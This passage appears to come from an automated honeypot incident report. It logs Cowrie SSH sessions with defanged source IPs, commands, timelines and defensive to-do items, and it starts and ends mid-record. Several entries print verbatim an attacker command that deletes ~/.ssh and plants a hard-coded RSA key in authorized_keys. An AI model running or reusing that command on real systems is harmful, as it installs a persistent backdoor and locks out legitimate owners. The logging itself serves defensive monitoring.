| `2026-07-04 06:20:32` | `cowrie.client.kex` |
| `2026-07-04 06:20:39` | `cowrie.login.success` |
| `2026-07-04 06:20:42` | `cowrie.session.params` |
| `2026-07-04 06:20:42` | `cowrie.command.input` |
| `2026-07-04 06:20:43` | `cowrie.log.closed` |
| `2026-07-04 06:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6448492191bd

| Field | Detail |
|---|---|
| **Source IP** | `45.225.135[.]30` |
| **First Seen** | 2026-07-04 06:22 |
| **Last Seen** | 2026-07-04 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id; uname -a; hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:22:43` | `cowrie.session.connect` |
| `2026-07-04 06:22:44` | `cowrie.client.version` |
| `2026-07-04 06:22:44` | `cowrie.client.kex` |
| `2026-07-04 06:22:45` | `cowrie.login.success` |
| `2026-07-04 06:22:46` | `cowrie.session.params` |
| `2026-07-04 06:22:46` | `cowrie.command.input` |
| `2026-07-04 06:22:47` | `cowrie.log.closed` |
| `2026-07-04 06:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.225.135[.]30` to AbuseIPDB if not already reported
- [ ] Block `45.225.135[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891db191f9d1

| Field | Detail |
|---|---|
| **Source IP** | `172.235.41[.]203` |
| **First Seen** | 2026-07-04 06:22 |
| **Last Seen** | 2026-07-04 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:22:48` | `cowrie.session.connect` |
| `2026-07-04 06:22:48` | `cowrie.login.success` |
| `2026-07-04 06:22:48` | `cowrie.session.params` |
| `2026-07-04 06:22:48` | `cowrie.command.input` |
| `2026-07-04 06:22:48` | `cowrie.command.input` |
| `2026-07-04 06:22:48` | `cowrie.command.failed` |
| `2026-07-04 06:22:48` | `cowrie.command.input` |
| `2026-07-04 06:22:48` | `cowrie.command.failed` |
| `2026-07-04 06:22:48` | `cowrie.command.input` |
| `2026-07-04 06:22:49` | `cowrie.log.closed` |
| `2026-07-04 06:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.235.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `172.235.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5502682430a

| Field | Detail |
|---|---|
| **Source IP** | `45.225.135[.]30` |
| **First Seen** | 2026-07-04 06:22 |
| **Last Seen** | 2026-07-04 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id; uname -a; hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:22:48` | `cowrie.session.connect` |
| `2026-07-04 06:22:49` | `cowrie.client.version` |
| `2026-07-04 06:22:49` | `cowrie.client.kex` |
| `2026-07-04 06:22:51` | `cowrie.login.success` |
| `2026-07-04 06:22:52` | `cowrie.session.params` |
| `2026-07-04 06:22:52` | `cowrie.command.input` |
| `2026-07-04 06:22:52` | `cowrie.log.closed` |
| `2026-07-04 06:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.225.135[.]30` to AbuseIPDB if not already reported
- [ ] Block `45.225.135[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93865da52be

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 06:32 |
| **Last Seen** | 2026-07-04 06:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:32:14` | `cowrie.session.connect` |
| `2026-07-04 06:32:15` | `cowrie.client.version` |
| `2026-07-04 06:32:15` | `cowrie.client.kex` |
| `2026-07-04 06:32:21` | `cowrie.login.success` |
| `2026-07-04 06:32:25` | `cowrie.session.params` |
| `2026-07-04 06:32:25` | `cowrie.command.input` |
| `2026-07-04 06:32:26` | `cowrie.log.closed` |
| `2026-07-04 06:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a061668b42df

| Field | Detail |
|---|---|
| **Source IP** | `34.22.194[.]117` |
| **First Seen** | 2026-07-04 06:38 |
| **Last Seen** | 2026-07-04 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:38:18` | `cowrie.session.connect` |
| `2026-07-04 06:38:18` | `cowrie.login.success` |
| `2026-07-04 06:38:18` | `cowrie.session.params` |
| `2026-07-04 06:38:18` | `cowrie.command.input` |
| `2026-07-04 06:38:18` | `cowrie.command.input` |
| `2026-07-04 06:38:18` | `cowrie.command.failed` |
| `2026-07-04 06:38:18` | `cowrie.command.input` |
| `2026-07-04 06:38:18` | `cowrie.log.closed` |
| `2026-07-04 06:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.194[.]117` to AbuseIPDB if not already reported
- [ ] Block `34.22.194[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1700ee8bec9

| Field | Detail |
|---|---|
| **Source IP** | `34.22.194[.]117` |
| **First Seen** | 2026-07-04 06:38 |
| **Last Seen** | 2026-07-04 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:38:18` | `cowrie.session.connect` |
| `2026-07-04 06:38:18` | `cowrie.login.success` |
| `2026-07-04 06:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.194[.]117` to AbuseIPDB if not already reported
- [ ] Block `34.22.194[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615bd5024d43

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 06:38 |
| **Last Seen** | 2026-07-04 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:38:26` | `cowrie.session.connect` |
| `2026-07-04 06:38:26` | `cowrie.client.version` |
| `2026-07-04 06:38:26` | `cowrie.client.kex` |
| `2026-07-04 06:38:26` | `cowrie.login.success` |
| `2026-07-04 06:38:27` | `cowrie.session.params` |
| `2026-07-04 06:38:27` | `cowrie.command.input` |
| `2026-07-04 06:38:27` | `cowrie.log.closed` |
| `2026-07-04 06:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d03a69393d9

| Field | Detail |
|---|---|
| **Source IP** | `34.22.194[.]117` |
| **First Seen** | 2026-07-04 06:38 |
| **Last Seen** | 2026-07-04 06:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:38:31` | `cowrie.session.connect` |
| `2026-07-04 06:38:31` | `cowrie.login.success` |
| `2026-07-04 06:38:31` | `cowrie.session.params` |
| `2026-07-04 06:38:31` | `cowrie.command.input` |
| `2026-07-04 06:38:31` | `cowrie.command.failed` |
| `2026-07-04 06:38:34` | `cowrie.log.closed` |
| `2026-07-04 06:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.194[.]117` to AbuseIPDB if not already reported
- [ ] Block `34.22.194[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c632a6c06a1

| Field | Detail |
|---|---|
| **Source IP** | `34.22.194[.]117` |
| **First Seen** | 2026-07-04 06:38 |
| **Last Seen** | 2026-07-04 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:38:33` | `cowrie.session.connect` |
| `2026-07-04 06:38:33` | `cowrie.login.success` |
| `2026-07-04 06:38:33` | `cowrie.session.params` |
| `2026-07-04 06:38:33` | `cowrie.command.input` |
| `2026-07-04 06:38:34` | `cowrie.log.closed` |
| `2026-07-04 06:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.22.194[.]117` to AbuseIPDB if not already reported
- [ ] Block `34.22.194[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa44e7347c4c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 06:40 |
| **Last Seen** | 2026-07-04 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:40:56` | `cowrie.session.connect` |
| `2026-07-04 06:40:56` | `cowrie.client.version` |
| `2026-07-04 06:40:56` | `cowrie.client.kex` |
| `2026-07-04 06:40:57` | `cowrie.login.success` |
| `2026-07-04 06:40:57` | `cowrie.direct-tcpip.request` |
| `2026-07-04 06:40:57` | `cowrie.direct-tcpip.data` |
| `2026-07-04 06:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-740d559c75d1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 06:44 |
| **Last Seen** | 2026-07-04 06:44 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:44:09` | `cowrie.session.connect` |
| `2026-07-04 06:44:12` | `cowrie.client.version` |
| `2026-07-04 06:44:12` | `cowrie.client.kex` |
| `2026-07-04 06:44:18` | `cowrie.login.success` |
| `2026-07-04 06:44:23` | `cowrie.session.params` |
| `2026-07-04 06:44:23` | `cowrie.command.input` |
| `2026-07-04 06:44:24` | `cowrie.log.closed` |
| `2026-07-04 06:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0169c1fda0bf

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 06:56 |
| **Last Seen** | 2026-07-04 06:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:56:11` | `cowrie.session.connect` |
| `2026-07-04 06:56:13` | `cowrie.client.version` |
| `2026-07-04 06:56:13` | `cowrie.client.kex` |
| `2026-07-04 06:56:19` | `cowrie.login.success` |
| `2026-07-04 06:56:23` | `cowrie.session.params` |
| `2026-07-04 06:56:23` | `cowrie.command.input` |
| `2026-07-04 06:56:24` | `cowrie.log.closed` |
| `2026-07-04 06:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41a562d55e8

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-07-04 06:59 |
| **Last Seen** | 2026-07-04 06:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:59:54` | `cowrie.session.connect` |
| `2026-07-04 06:59:54` | `cowrie.client.version` |
| `2026-07-04 06:59:54` | `cowrie.client.kex` |
| `2026-07-04 06:59:55` | `cowrie.login.success` |
| `2026-07-04 06:59:55` | `cowrie.session.params` |
| `2026-07-04 06:59:55` | `cowrie.command.input` |
| `2026-07-04 06:59:55` | `cowrie.command.failed` |
| `2026-07-04 06:59:56` | `cowrie.log.closed` |
| `2026-07-04 06:59:56` | `cowrie.session.params` |
| `2026-07-04 06:59:56` | `cowrie.command.input` |
| `2026-07-04 06:59:57` | `cowrie.session.file_download` |
| `2026-07-04 06:59:57` | `cowrie.log.closed` |
| `2026-07-04 06:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b1d6768cf4

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-07-04 06:59 |
| **Last Seen** | 2026-07-04 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:59:57` | `cowrie.session.connect` |
| `2026-07-04 06:59:57` | `cowrie.client.version` |
| `2026-07-04 06:59:57` | `cowrie.client.kex` |
| `2026-07-04 06:59:57` | `cowrie.login.success` |
| `2026-07-04 06:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-210842c80c93

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-07-04 06:59 |
| **Last Seen** | 2026-07-04 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 06:59:58` | `cowrie.session.connect` |
| `2026-07-04 06:59:58` | `cowrie.client.version` |
| `2026-07-04 06:59:58` | `cowrie.client.kex` |
| `2026-07-04 06:59:58` | `cowrie.login.success` |
| `2026-07-04 06:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b854b76f20c

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-07-04 07:02 |
| **Last Seen** | 2026-07-04 07:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:02:04` | `cowrie.session.connect` |
| `2026-07-04 07:02:04` | `cowrie.client.version` |
| `2026-07-04 07:02:04` | `cowrie.client.kex` |
| `2026-07-04 07:02:05` | `cowrie.login.success` |
| `2026-07-04 07:02:06` | `cowrie.session.params` |
| `2026-07-04 07:02:06` | `cowrie.command.input` |
| `2026-07-04 07:02:06` | `cowrie.command.failed` |
| `2026-07-04 07:02:06` | `cowrie.log.closed` |
| `2026-07-04 07:02:07` | `cowrie.session.params` |
| `2026-07-04 07:02:07` | `cowrie.command.input` |
| `2026-07-04 07:02:07` | `cowrie.session.file_download` |
| `2026-07-04 07:02:07` | `cowrie.log.closed` |
| `2026-07-04 07:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6165f1078252

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-07-04 07:02 |
| **Last Seen** | 2026-07-04 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:02:08` | `cowrie.session.connect` |
| `2026-07-04 07:02:08` | `cowrie.client.version` |
| `2026-07-04 07:02:09` | `cowrie.client.kex` |
| `2026-07-04 07:02:09` | `cowrie.login.success` |
| `2026-07-04 07:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659de1e669a1

| Field | Detail |
|---|---|
| **Source IP** | `118.163.132[.]211` |
| **First Seen** | 2026-07-04 07:02 |
| **Last Seen** | 2026-07-04 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:02:10` | `cowrie.session.connect` |
| `2026-07-04 07:02:10` | `cowrie.client.version` |
| `2026-07-04 07:02:10` | `cowrie.client.kex` |
| `2026-07-04 07:02:11` | `cowrie.login.success` |
| `2026-07-04 07:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.132[.]211` to AbuseIPDB if not already reported
- [ ] Block `118.163.132[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f05c8516a4c

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-07-04 07:02 |
| **Last Seen** | 2026-07-04 07:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:02:54` | `cowrie.session.connect` |
| `2026-07-04 07:02:54` | `cowrie.client.version` |
| `2026-07-04 07:02:54` | `cowrie.client.kex` |
| `2026-07-04 07:02:55` | `cowrie.login.success` |
| `2026-07-04 07:02:56` | `cowrie.session.params` |
| `2026-07-04 07:02:56` | `cowrie.command.input` |
| `2026-07-04 07:02:56` | `cowrie.command.failed` |
| `2026-07-04 07:02:57` | `cowrie.log.closed` |
| `2026-07-04 07:02:58` | `cowrie.session.params` |
| `2026-07-04 07:02:58` | `cowrie.command.input` |
| `2026-07-04 07:02:58` | `cowrie.session.file_download` |
| `2026-07-04 07:02:58` | `cowrie.log.closed` |
| `2026-07-04 07:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087350a4f084

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-07-04 07:02 |
| **Last Seen** | 2026-07-04 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:02:58` | `cowrie.session.connect` |
| `2026-07-04 07:02:58` | `cowrie.client.version` |
| `2026-07-04 07:02:58` | `cowrie.client.kex` |
| `2026-07-04 07:02:59` | `cowrie.login.success` |
| `2026-07-04 07:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77460e5d6dfd

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-07-04 07:03 |
| **Last Seen** | 2026-07-04 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:03:00` | `cowrie.session.connect` |
| `2026-07-04 07:03:00` | `cowrie.client.version` |
| `2026-07-04 07:03:00` | `cowrie.client.kex` |
| `2026-07-04 07:03:01` | `cowrie.login.success` |
| `2026-07-04 07:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffb4c0b0cdba

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-04 07:07 |
| **Last Seen** | 2026-07-04 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 07:07:05` | `cowrie.session.connect` |
| `2026-07-04 07:07:05` | `cowrie.client.version` |
| `2026-07-04 07:07:06` | `cowrie.client.kex` |
| `2026-07-04 07:07:07` | `cowrie.login.success` |
| `2026-07-04 07:07:08` | `cowrie.session.params` |
| `2026-07-04 07:07:08` | `cowrie.command.input` |
| `2026-07-04 07:07:08` | `cowrie.command.failed` |
| `2026-07-04 07:07:08` | `cowrie.log.closed` |
| `2026-07-04 07:07:09` | `cowrie.session.params` |
| `2026-07-04 07:07:09` | `cowrie.command.input` |
